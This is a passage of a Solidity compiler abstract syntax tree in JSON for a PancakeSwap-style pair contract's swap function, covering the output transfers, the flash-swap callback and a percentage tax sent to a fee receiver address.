																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12719:24:6"
													},
													{
														"assignments": [
															1927
														],
														"declarations": [
															{
																"constant": false,
																"id": 1927,
																"name": "_token1",
																"nodeType": "VariableDeclaration",
																"scope": 2037,
																"src": "12757:15:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																},
																"typeName": {
																	"id": 1926,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "12757:7:6",
																	"stateMutability": "nonpayable",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1929,
														"initialValue": {
															"argumentTypes": null,
															"id": 1928,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 970,
															"src": "12775:6:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "12757:24:6"
													},
													{
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 1937,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		"id": 1933,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1931,
																			"name": "to",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1858,
																			"src": "12803:2:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "!=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1932,
																			"name": "_token0",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1923,
																			"src": "12809:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"src": "12803:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		"id": 1936,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1934,
																			"name": "to",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1858,
																			"src": "12820:2:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "!=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1935,
																			"name": "_token1",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1927,
																			"src": "12826:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"src": "12820:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "12803:30:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"argumentTypes": null,
																	"hexValue": "50616e63616b653a20494e56414c49445f544f",
																	"id": 1938,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12835:21:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_2d7663edc966955a2d1409fdc782de8590859b8600a8a34482f57bae932ffa4e",
																		"typeString": "literal_string \"Pancake: INVALID_TO\""
																	},
																	"value": "Pancake: INVALID_TO"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_stringliteral_2d7663edc966955a2d1409fdc782de8590859b8600a8a34482f57bae932ffa4e",
																		"typeString": "literal_string \"Pancake: INVALID_TO\""
																	}
																],
																"id": 1930,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	2359,
																	2360
																],
																"referencedDeclaration": 2360,
																"src": "12795:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 1939,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "12795:62:6",
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 1940,
														"nodeType": "ExpressionStatement",
														"src": "12795:62:6"
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1943,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1941,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1854,
																"src": "12875:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1942,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "12888:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "12875:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1950,
														"nodeType": "IfStatement",
														"src": "12871:61:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1945,
																		"name": "_token0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1923,
																		"src": "12905:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1946,
																		"name": "to",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1858,
																		"src": "12914:2:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1947,
																		"name": "taxamount0Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1901,
																		"src": "12918:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1944,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1096,
																	"src": "12891:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1948,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "12891:41:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1949,
															"nodeType": "ExpressionStatement",
															"src": "12891:41:6"
														}
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1953,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1951,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1856,
																"src": "12984:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1952,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "12997:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "12984:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1960,
														"nodeType": "IfStatement",
														"src": "12980:61:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1955,
																		"name": "_token1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1927,
																		"src": "13014:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1956,
																		"name": "to",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1858,
																		"src": "13023:2:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1957,
																		"name": "taxamount1Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1912,
																		"src": "13027:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1954,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1096,
																	"src": "13000:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1958,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13000:41:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1959,
															"nodeType": "ExpressionStatement",
															"src": "13000:41:6"
														}
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1964,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1961,
																	"name": "data",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1860,
																	"src": "13093:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_calldata_ptr",
																		"typeString": "bytes calldata"
																	}
																},
																"id": 1962,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "13093:11:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1963,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13107:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "13093:15:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1976,
														"nodeType": "IfStatement",
														"src": "13089:237:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 1969,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2356,
																			"src": "13171:3:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 1970,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "13171:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1971,
																		"name": "taxamount0Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1901,
																		"src": "13203:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1972,
																		"name": "taxamount1Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1912,
																		"src": "13253:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1973,
																		"name": "data",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1860,
																		"src": "13304:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_calldata_ptr",
																			"typeString": "bytes calldata"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		{
																			"typeIdentifier": "t_bytes_calldata_ptr",
																			"typeString": "bytes calldata"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1966,
																				"name": "to",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1858,
																				"src": "13134:2:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			],
																			"id": 1965,
																			"name": "ICallee",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 449,
																			"src": "13126:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_ICallee_$449_$",
																				"typeString": "type(contract ICallee)"
																			}
																		},
																		"id": 1967,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13126:11:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_ICallee_$449",
																			"typeString": "contract ICallee"
																		}
																	},
																	"id": 1968,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "pancakeCall",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 448,
																	"src": "13126:23:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$_t_uint256_$_t_bytes_memory_ptr_$returns$__$",
																		"typeString": "function (address,uint256,uint256,bytes memory) external"
																	}
																},
																"id": 1974,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13126:200:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1975,
															"nodeType": "ExpressionStatement",
															"src": "13126:200:6"
														}
													},
													{
														"assignments": [
															1978
														],
														"declarations": [
															{
																"constant": false,
																"id": 1978,
																"name": "tax0",
																"nodeType": "VariableDeclaration",
																"scope": 2037,
																"src": "13341:9:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1977,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "13341:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1985,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1984,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 1981,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1979,
																			"name": "amount0Out",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1854,
																			"src": "13354:10:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "*",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1980,
																			"name": "taxfee",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 972,
																			"src": "13367:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "13354:19:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 1982,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "13353:21:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 1983,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13377:3:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "13353:27:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "13341:39:6"
													},
													{
														"assignments": [
															1987
														],
														"declarations": [
															{
																"constant": false,
																"id": 1987,
																"name": "tax1",
																"nodeType": "VariableDeclaration",
																"scope": 2037,
																"src": "13394:9:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 1986,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "13394:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 1994,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1993,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 1990,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1988,
																			"name": "amount1Out",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1856,
																			"src": "13407:10:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "*",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1989,
																			"name": "taxfee",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 972,
																			"src": "13420:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "13407:19:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 1991,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "13406:21:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 1992,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13430:3:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "13406:27:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "13394:39:6"
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1997,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1995,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1854,
																"src": "13452:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1996,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13465:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "13452:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 2004,
														"nodeType": "IfStatement",
														"src": "13448:60:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1999,
																		"name": "_token0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1923,
																		"src": "13482:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 2000,
																		"name": "FeeResiver",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 950,
																		"src": "13491:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 2001,
																		"name": "tax0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1978,
																		"src": "13503:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1998,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1096,
																	"src": "13468:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 2002,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13468:40:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 2003,
															"nodeType": "ExpressionStatement",
															"src": "13468:40:6"
														}
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2007,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 2005,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1856,
																"src": "13560:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 2006,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13573:1:6",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "13560:14:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 2014,
														"nodeType": "IfStatement",
														"src": "13556:60:6",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 2009,
																		"name": "_token1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1927,
																		"src": "13590:7:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 2010,
																		"name": "FeeResiver",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 950,
																		"src": "13599:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 2011,
																		"name": "tax1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1987,
																		"src": "13611:4:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 2008,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1096,
																	"src": "13576:13:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 2012,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13576:40:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 2013,
															"nodeType": "ExpressionStatement",
															"src": "13576:40:6"
														}
													},
													{
														"expression": {
															"argumentTypes": null,
															"id": 2024,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"argumentTypes": null,
																"id": 2015,
																"name": "balance0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1895,
																"src": "13664:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
